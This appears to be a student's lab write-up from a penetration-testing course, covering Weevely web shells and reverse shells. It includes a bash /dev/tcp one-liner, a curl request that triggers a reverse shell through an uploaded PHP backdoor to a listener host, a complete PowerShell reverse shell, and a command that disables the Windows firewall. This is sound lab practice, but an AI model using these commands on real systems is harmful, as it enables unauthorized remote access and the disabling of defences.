# Reverse Shells

### Lab 8.1 Weevley

Weevley is a built in tool included within Kali. Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime. Upload weevely PHP agent to a target web server to get remote shell access to it. It has more than 30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate privileges, and spread into the target network.

The Usage is pretty simple. The commands below show the generation of a php agent that will then get upoaded to a webserver.
```
weevely generate <password> <path>
weevely <URL> <password> [cmd]
```

A password is needed to encrypt the agent

The upload process to our FTP is simple. Triggering an FTP session by using `ftp anonymous@10.0.5.25` then moving directories to `upload`. From here we can upload the file directly to the right directory. That command is `put`

`put pippin_agent.php `

With a succsessful upload we can now utilize the agent.

We can run the agent by using `weevely http://10.0.5.25/upload/pippin_agent.php <insert password>`

From here we now have a webshell into 10.0.5.25 and can run commands. 

#### Refelction

The diffrence in stealth is made clear when using weevely compared to a curl using simple_backdoor. The Wireshark stream showed a comlpete detail and display of the leaked etc/passwd/ output when using simple_backdoor.php. Using Weevely there was obfuscation in the TCP stream that Wireshark couldnt blantanly see. 

### Activity 8.2 Reverse Shells

In this lab we are tasked with creating and implementing a reverseshell on a new workstation. This worstaion was given to us from the Professor. Our Cyber.local credentials are to be used to ssh into this new workstation. 

Reverse Shell Checklist 
* DHCP address from the attacking computer
* Start an nc listner on a specified port; e.g. 4449/tcp
* Use `/bin/bash -i >& /dev/tcp/ATTACKINGIP/PORT 0>&1`

This will start the reverse shell session. On our `nc` listner there should be a connect message and you'll have acess to the remote system. 

Trying this on pippen gets a little more involved. There are multiple ways to achieve a reverse shell on pippen. The method I used was utilizing simple-backdoor.php and a curl command. 

I logged into the FTP server to make sure simple-backdoor.php was uploaded. After confirming, I prepare my curl command using the foramt from previous labs.

`curl "http://10.0.5.25/upload/simple-backdoor.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.17.156/4449+0>%261'"`

Now run the `nc` listner on port 4449 and on another terminal run the curl command. This will use `simple-backdoor.php` to envoke the `/bin/bash` command and connect the shells.


This process on our Windows VM has more security concerns. The main roadblock on Windows is actually Windows Defender. The commadn were given to enact the shell 

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKERIP',ATTACKERPORT); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0){;$data= (New-Object -TypeName System.Text.ASCIIENcoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
It will not run becasue of Windows Defender to temporarily disable Windows defedner we need to run a command in powershell. Make sure to envoke administartive power.

`Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`

Now run the powershell command and envoke a shell on the `nc` lister on our Kali box

#### Reflection
The reverse webshell is quite usefull when you can upload files to a service. Weevely also makes agent creation easy. 
